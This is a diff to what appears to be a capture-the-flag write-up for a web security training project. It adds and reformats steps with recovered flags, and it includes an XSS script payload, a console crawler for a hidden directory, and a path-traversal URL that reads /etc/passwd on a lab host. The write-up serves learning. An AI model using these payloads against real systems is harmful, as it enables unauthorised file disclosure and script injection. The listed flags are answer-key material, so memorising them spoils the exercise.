@@ -32,7 +32,7 @@ Darky 42!
   3. <script>alert('XSS!')</script>
   4. Flag = 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
 
-  #6 .hidden
+# 6 .hidden
   1. Execute this script in console to find all README in .hidden recursively
   ```
   async function crawl(url, depth=0) {
@@ -70,3 +70,8 @@ VM147:17 🚩 FLAG FOUND: http://10.11.249.65/.hidden/whtccjokayshttvxycsvykxcfm
 VM147:18 Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
 ```
   3. Flag = d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
+
+# 7. Local file inclusion
+  1. Navigate to http://10.11.249.72/?page=../../../../../../../../../etc/passwd
+  2. Flag = b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
+
